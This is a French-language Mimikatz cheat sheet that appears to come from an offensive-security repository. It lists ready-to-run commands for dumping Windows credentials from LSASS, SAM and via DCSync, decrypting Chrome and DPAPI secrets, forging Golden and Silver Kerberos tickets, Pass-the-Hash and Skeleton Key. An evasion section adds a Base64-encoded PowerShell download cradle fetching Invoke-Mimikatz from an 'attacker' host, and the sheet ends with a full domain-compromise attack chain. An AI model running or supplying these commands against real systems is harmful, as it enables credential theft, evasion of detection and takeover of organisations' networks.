# 🔑 Mimikatz — fiche pratique complète

<!-- language-home-navigation -->
[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ███╗   ███╗██╗███╗   ███╗██╗██╗  ██╗ █████╗ ████████╗███████╗
  ████╗ ████║██║████╗ ████║██║██║ ██╔╝██╔══██╗╚══██╔══╝╚══════╝
  ██╔████╔██║██║██╔████╔██║██║█████╔╝ ███████║   ██║   ███████╗
  ██║╚██╔╝██║██║██║╚██╔╝██║██║██╔═██╗ ██╔══██║   ██║   ╚════██║
  ██║ ╚═╝ ██║██║██║ ╚═╝ ██║██║██║  ██╗██║  ██║   ██║   ███████║
  ╚═╝     ╚═╝╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝
               Windows Credential Extraction Tool
```

<p align="center">
  <img src="https://img.shields.io/badge/Mimikatz-Post_Exploitation-red?style=for-the-badge" alt="Mimikatz">
  <img src="https://img.shields.io/badge/Windows-Credentials-blue?style=for-the-badge" alt="Credentials">
  <img src="https://img.shields.io/badge/Active_Directory-orange?style=for-the-badge" alt="AD">
  <img src="https://img.shields.io/badge/Kerberos-green?style=for-the-badge" alt="Kerberos">
</p>

<p align="center">
  <b>🔓 Un outil majeur d’extraction d’identifiants Windows</b>
</p>

> **Précisions de version :** les capacités dépendent de Windows, des protections de LSASS et des droits disponibles. Les scripts PowerSploit et les commandes CrackMapExec sont conservés dans leur forme historique. Renommer un fichier, l’encoder en Base64 ou l’exécuter en mémoire ne garantit pas l’absence de détection. Le schéma ASCII conserve le texte du document source.
> **Correction de vocabulaire :** `token::elevate` adopte un jeton disponible ; cette commande n’active pas « tous les privilèges ». Voir le [module token officiel](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_token.c). Les commandes `lsadump::lsa /patch` et `/inject` interrogent LSA pour obtenir des entrées SAM/AD ; ce n’est pas une copie directe du fichier NTDS.dit. Voir le [module lsadump officiel](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_lsadump.c).
> **Lecture des exemples Kerberos :** la commande présentée sous « contrôleur de domaine cible » utilise `/sids`, qui ajoute des SID ; elle ne sélectionne pas un contrôleur de domaine. Ce comportement est visible dans le [module Kerberos officiel](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kerberos/kuhl_m_kerberos.c). Noms, SID et empreintes abrégés sont illustratifs. Les prérequis de validation des tickets dépendent des versions et mises à jour.

---

## 📋 Table des matières

- [Qu’est-ce que Mimikatz](#-quest-ce-que-mimikatz)
- [Prise en main](#-prise-en-main)
- [Méthodes d’exécution](#-méthodes-dexécution)
- [Modules principaux](#-modules-principaux)
- [Extraction d’identifiants](#-extraction-didentifiants)
- [Attaques Kerberos](#-attaques-kerberos)
- [Attaques avancées](#-attaques-avancées)
- [Techniques d’évasion](#-techniques-dévasion)
- [Référence rapide](#-référence-rapide)

---

## 🎯 Qu’est-ce que Mimikatz

**Mimikatz** est un outil de post-exploitation créé par **Benjamin Delpy** (@gentilkiwi) qui permet d’extraire :

- 🔑 Des **mots de passe en clair** depuis la mémoire Windows (LSASS)
- 🎫 Des **tickets Kerberos** (TGT, TGS)
- 🔐 Des **empreintes NTLM** depuis SAM/NTDS
- 📜 Des **certificats** et des clés privées
- 🗝️ Des **identifiants mis en cache**
- 🔒 Des **secrets DPAPI**

### Pourquoi est-ce important ?

| Cas d’usage | Description |
|----------|-------------|
| **Vol d’identifiants** | Extraire les mots de passe de la mémoire |
| **Mouvement latéral** | Pass-the-Hash, Pass-the-Ticket |
| **Élévation de privilèges** | Usurper le contexte d’utilisateurs |
| **Persistance** | Golden Tickets et Silver Tickets |
| **Contrôle du domaine** | DCSync pour compromettre l’ensemble d’Active Directory |

---

## 🚀 Prise en main

### Téléchargement

```bash
# Dépôt officiel
git clone https://github.com/gentilkiwi/mimikatz.git

# Binaires précompilés (versions publiées)
# https://github.com/gentilkiwi/mimikatz/releases
```

### Prérequis

- Privilèges **Administrator/SYSTEM** pour la plupart des fonctions
- **SeDebugPrivilege** pour accéder à LSASS
- Windows x64 ou x86

### Premières commandes

```cmd
# Lancer mimikatz
mimikatz.exe

# Vérifier les privilèges
mimikatz # privilege::debug
Privilege '20' OK

# Activer tous les privilèges (libellé source ; voir la précision)
mimikatz # token::elevate

# Quitter
mimikatz # exit
```

---

## 💻 Méthodes d’exécution

### 1. Binaire autonome

```cmd
# Exécution directe (détectée par les antivirus selon le document source)
mimikatz.exe

# Commande sur une seule ligne
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Enregistrer la sortie dans un fichier
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > output.txt

# Avec la commande log
mimikatz.exe "log output.log" "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

### 2. PowerShell (Invoke-Mimikatz)

```powershell
# Télécharger et exécuter en mémoire (fileless, sans fichier sur disque)
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'

# Extraire les identifiants
Invoke-Mimikatz -DumpCreds

# Extraire les certificats
Invoke-Mimikatz -DumpCerts

# Exécuter sur une machine distante
Invoke-Mimikatz -ComputerName DC01
```

### 3. Metasploit (Kiwi)

```bash
# Dans une session Meterpreter
meterpreter > load kiwi

# Afficher l’aide
meterpreter > help kiwi

# Extraire tous les identifiants
meterpreter > creds_all

# Extraire les empreintes
meterpreter > lsa_dump_sam

# Extraire les secrets
meterpreter > lsa_dump_secrets

# Tickets Kerberos
meterpreter > kerberos_ticket_list
meterpreter > kerberos_ticket_use /path/to/ticket.kirbi
```

### 4. CrackMapExec

```bash
# Extraire SAM
crackmapexec smb 192.168.1.0/24 -u admin -p password --sam

# Extraire les données LSA
crackmapexec smb 192.168.1.0/24 -u admin -p password --lsa

# Extraire les données NTDS
crackmapexec smb dc01.domain.local -u admin -p password --ntds
```

### 5. Depuis une capture mémoire

```cmd
# Capturer la mémoire de LSASS avec le Gestionnaire des tâches ou procdump
procdump.exe -ma lsass.exe lsass.dmp

# Charger la capture dans mimikatz
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

---

## 🔧 Modules principaux

### Vue d’ensemble des modules

| Module | Description |
|--------|-------------|
| **sekurlsa** | Extraire les identifiants de la mémoire de LSASS |
| **lsadump** | Extraire SAM, les données NTDS, les secrets et le cache |
| **kerberos** | Manipuler les tickets Kerberos |
| **crypto** | Certificats CryptoAPI |
| **vault** | Windows Vault (gestionnaire d’identifiants) |
| **token** | Manipuler les jetons de sécurité (tokens) |
| **privilege** | Manipuler les privilèges |
| **process** | Manipuler les processus |
| **service** | Manipuler les services |
| **dpapi** | Secrets DPAPI |
| **misc** | Commandes diverses |

### Obtenir de l’aide

```cmd
# Lister tous les modules
mimikatz # ::

# Aide d’un module
mimikatz # sekurlsa::
mimikatz # lsadump::
mimikatz # kerberos::
```

---

## 🔐 Extraction d’identifiants

### Module sekurlsa (LSASS)

```cmd
# Activer d’abord le privilège de débogage !
mimikatz # privilege::debug

# Extraire tous les mots de passe de connexion (texte clair, NTLM, SHA1)
mimikatz # sekurlsa::logonpasswords

# Extraire uniquement les empreintes NTLM
mimikatz # sekurlsa::msv

# Extraire les tickets Kerberos
mimikatz # sekurlsa::tickets

# Extraire les identifiants WDigest (en clair si la fonctionnalité est activée)
mimikatz # sekurlsa::wdigest

# Extraire les clés de chiffrement Kerberos
mimikatz # sekurlsa::ekeys

# Extraire les identifiants DPAPI
mimikatz # sekurlsa::dpapi

# Extraire les identifiants d’un processus précis
mimikatz # sekurlsa::logonpasswords /process:lsass.exe

# Extraire les identifiants TsPkg (RDP)
mimikatz # sekurlsa::tspkg

# Extraire les identifiants LiveSSP
mimikatz # sekurlsa::livessp

# Extraire les identifiants SSP
mimikatz # sekurlsa::ssp

# Extraire les identifiants CloudAP (Azure AD)
mimikatz # sekurlsa::cloudap
```

### Module lsadump (SAM/NTDS)

```cmd
# Extraire la base SAM (comptes locaux)
mimikatz # lsadump::sam

# Extraire SAM avec la ruche SYSTEM
mimikatz # lsadump::sam /system:SYSTEM /sam:SAM

# Extraire les secrets LSA
mimikatz # lsadump::secrets

# Extraire les identifiants mis en cache (DCC2)
mimikatz # lsadump::cache

# DCSync (réplication du contrôleur de domaine)
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator
mimikatz # lsadump::dcsync /domain:domain.local /all /csv

# Extraire NTDS.dit (contrôleur de domaine ; libellé source, voir la précision)
mimikatz # lsadump::lsa /patch
mimikatz # lsadump::lsa /inject

# Extraire les clés des relations d’approbation
mimikatz # lsadump::trust /patch

# Extraire les clés de sauvegarde (DPAPI)
mimikatz # lsadump::backupkeys /system:dc01.domain.local /export
```

### Module vault (gestionnaire d’identifiants)

```cmd
# Lister les identifiants du coffre
mimikatz # vault::list

# Extraire les identifiants du coffre
mimikatz # vault::cred /patch
```

### Module dpapi

```cmd
# Extraire les clés maîtresses DPAPI
mimikatz # dpapi::masterkey /in:masterkey_file /sid:user_sid /password:password

# Déchiffrer un blob DPAPI
mimikatz # dpapi::blob /in:blob_file /masterkey:key

# Mots de passe Chrome
mimikatz # dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
```

---

## 🎫 Attaques Kerberos

### Afficher les tickets

```cmd
# Lister tous les tickets
mimikatz # kerberos::list

# Lister les tickets avec leurs détails
mimikatz # kerberos::list /export

# Exporter tous les tickets
mimikatz # sekurlsa::tickets /export
```

### Pass-the-Ticket (PtT)

```cmd
# Supprimer les tickets existants
mimikatz # kerberos::purge

# Importer un ticket
mimikatz # kerberos::ptt ticket.kirbi

# Vérifier le ticket
mimikatz # kerberos::list
```

### Golden Ticket (persistance avec les droits d’administration du domaine)

```cmd
# Prérequis :
# - Nom du domaine (domain.local)
# - SID du domaine (S-1-5-21-...)
# - Empreinte NTLM de krbtgt
# - Nom d’utilisateur cible (peut être fictif selon le document source)

# Créer un Golden Ticket
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:ntlm_hash /ptt

# Créer et exporter
mimikatz # kerberos::golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /ticket:golden.kirbi

# Avec des groupes précis (RID 500 = Admin, 512 = Domain Admins, etc.)
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /groups:500,501,513,512,520,518,519 /ptt

# Avec un contrôleur de domaine cible (libellé source ; voir la précision)
mimikatz # kerberos::golden /user:admin /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /sids:S-1-5-21-xxx-519 /ptt
```

### Silver Ticket (propre à un service)

```cmd
# Prérequis :
# - Nom du domaine
# - SID du domaine
# - Empreinte NTLM du compte de service cible
# - SPN du service

# Créer un Silver Ticket pour CIFS (partages de fichiers)
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:cifs /rc4:service_hash /ptt

# Silver Ticket pour HTTP (web)
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:web.domain.local /service:http /rc4:hash /ptt

# Silver Ticket pour SQL
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:sql.domain.local /service:MSSQLSvc /rc4:hash /ptt

# Silver Ticket pour WinRM/PSRemoting
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:http /rc4:hash /ptt
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:wsman /rc4:hash /ptt
```

---

## 💀 Attaques avancées

### Pass-the-Hash (PtH)

```cmd
# Exécuter une commande sous l’identité d’un utilisateur avec son empreinte NTLM
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:hash /run:cmd.exe

# Avec des clés AES
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /aes256:aes_key /run:powershell.exe

# PtH pour lancer un processus
mimikatz # sekurlsa::pth /user:admin /domain:. /ntlm:hash /run:"powershell -ep bypass"
```

### Overpass-the-Hash (Pass-the-Key)

```cmd
# Convertir une empreinte NTLM en ticket Kerberos
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:hash /run:cmd.exe

# Demander ensuite un TGT
# klist devrait afficher le ticket Kerberos
```

### Attaque DCSync

```cmd
# Répliquer un seul utilisateur
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator

# Répliquer krbtgt (pour un Golden Ticket)
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt

# Répliquer tous les utilisateurs
mimikatz # lsadump::dcsync /domain:domain.local /all /csv

# Effectuer la réplication auprès d’un contrôleur de domaine précis
mimikatz # lsadump::dcsync /domain:domain.local /dc:DC01.domain.local /user:Administrator
```

### Skeleton Key

```cmd
# Injecter une Skeleton Key dans LSASS du contrôleur de domaine (les utilisateurs peuvent alors s’authentifier avec "mimikatz" selon l’exemple source)
mimikatz # misc::skeleton

# Persistance jusqu’au redémarrage du contrôleur de domaine
# Connexion avec n’importe quel utilisateur : password = mimikatz
```

### Exploitation de DPAPI

```cmd
# Extraire les clés maîtresses
mimikatz # sekurlsa::dpapi

# Déchiffrer un fichier d’identifiants
mimikatz # dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\xxx /masterkey:key

# Mots de passe RDP enregistrés
mimikatz # dpapi::rdg /in:rdp_file.rdg /masterkey:key
```

### Manipulation des jetons de sécurité

```cmd
# Lister les jetons
mimikatz # token::list

# Obtenir le contexte SYSTEM
mimikatz # token::elevate

# Adopter le contexte d’un utilisateur précis
mimikatz # token::elevate /user:Administrator

# Rétablir le jeton d’origine
mimikatz # token::revert

# Exécuter sous l’identité d’un utilisateur précis
mimikatz # token::run /user:domain\admin
```

---

<a id="-techniques-dévasion"></a>
## 🛡️ Techniques d’évasion

### Noms masqués

```cmd
# Renommer mimikatz.exe
rename mimikatz.exe m.exe
rename mimikatz.exe totally_legit.exe
```

### Obfuscation PowerShell

```powershell
# Encoder en Base64
$command = "IEX (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
powershell -enc $encoded
```

### Exécution uniquement en mémoire

```powershell
# Invoke-Mimikatz (fileless, sans fichier sur disque)
IEX (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')
Invoke-Mimikatz

# Ou utiliser kiwi dans Meterpreter
meterpreter > load kiwi
meterpreter > creds_all
```

### Autres méthodes de capture de LSASS

```cmd
# Procdump (signé par Microsoft)
procdump.exe -ma lsass.exe lsass.dmp

# comsvcs.dll (intégré à Windows)
rundll32.exe comsvcs.dll, MiniDump <lsass_pid> dump.dmp full

# Gestionnaire des tâches (interface graphique)
# Clic droit sur lsass.exe > Create dump file (créer un fichier de capture mémoire)

# SQLDumper (fourni avec SQL Server)
sqldumper.exe <lsass_pid> 0 0x01100
```

### Contournement de Credential Guard

> **Précision :** le message d’erreur montré n’est pas à lui seul une preuve de l’activation de Credential Guard. Utilisez les [méthodes officielles de vérification de Microsoft](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/configure). DCSync est une autre opération, reposant sur des droits de réplication du domaine ; ce n’est pas un contournement local universel de Credential Guard.

```cmd
# Vérifier si Credential Guard est activé (interprétation source ; voir la précision)
mimikatz # sekurlsa::logonpasswords
# Affichera "ERROR kuhl_m_sekurlsa_acquireLSA" selon le document source

# Autre approche : utiliser DCSync
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator
```

---

## 📊 Référence rapide

### Commandes essentielles sur une seule ligne

```cmd
# Extraire tous les identifiants
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Extraire SAM
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"

# DCSync pour tous les utilisateurs
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:domain.local /all /csv" "exit"

# Golden Ticket
mimikatz.exe "privilege::debug" "kerberos::golden /user:admin /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /ptt" "exit"

# Pass-the-Hash
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:admin /domain:domain.local /ntlm:hash /run:cmd.exe" "exit"
```

### Référence rapide des modules

| Commande | Description |
|---------|-------------|
| `privilege::debug` | Activer le privilège de débogage |
| `token::elevate` | Adopter un jeton SYSTEM disponible |
| `sekurlsa::logonpasswords` | Extraire les identifiants présents dans LSASS |
| `sekurlsa::msv` | Extraire les empreintes NTLM |
| `sekurlsa::tickets` | Extraire les tickets Kerberos |
| `sekurlsa::pth` | Pass-the-Hash |
| `lsadump::sam` | Extraire la base SAM |
| `lsadump::secrets` | Extraire les secrets LSA |
| `lsadump::dcsync` | Effectuer une attaque DCSync |
| `lsadump::lsa /patch` | Extraire les entrées SAM/AD via LSA sur le contrôleur de domaine |
| `kerberos::list` | Lister les tickets Kerberos |
| `kerberos::ptt` | Pass-the-Ticket |
| `kerberos::golden` | Créer un Golden Ticket ou un Silver Ticket |
| `kerberos::purge` | Supprimer les tickets |
| `vault::list` | Lister les identifiants du coffre |
| `dpapi::cred` | Déchiffrer les identifiants DPAPI |

### Exemple de chaîne d’attaque

```
1. Obtenir un accès initial
2. privilege::debug
3. sekurlsa::logonpasswords (obtenir les identifiants)
4. sekurlsa::pth (mouvement latéral)
5. lsadump::dcsync /user:krbtgt (obtenir l’empreinte de krbtgt)
6. kerberos::golden (créer un Golden Ticket)
7. Compromission complète du domaine !
```

---

## 📚 Ressources

- [Dépôt GitHub officiel](https://github.com/gentilkiwi/mimikatz)
- [Wiki Mimikatz](https://github.com/gentilkiwi/mimikatz/wiki)
- [Guide Mimikatz d’ADSecurity](https://adsecurity.org/?page_id=1821)
- [HackTricks Mimikatz](https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-mimikatz)

### Fiches connexes
- [Élévation de privilèges Windows](../../Windows-PrivEsc/README.md)
- [Metasploit](../../Metasploit/translations/README.fr.md)
- [Meterpreter](../../Metasploit/translations/Meterpreter.fr.md)

---

<p align="center">
  <b>🔑 Maîtrisez l’analyse des attaques contre les identifiants Windows !</b><br>
  <i>Mimikatz — Le couteau suisse du hacking sous Windows</i>
</p>
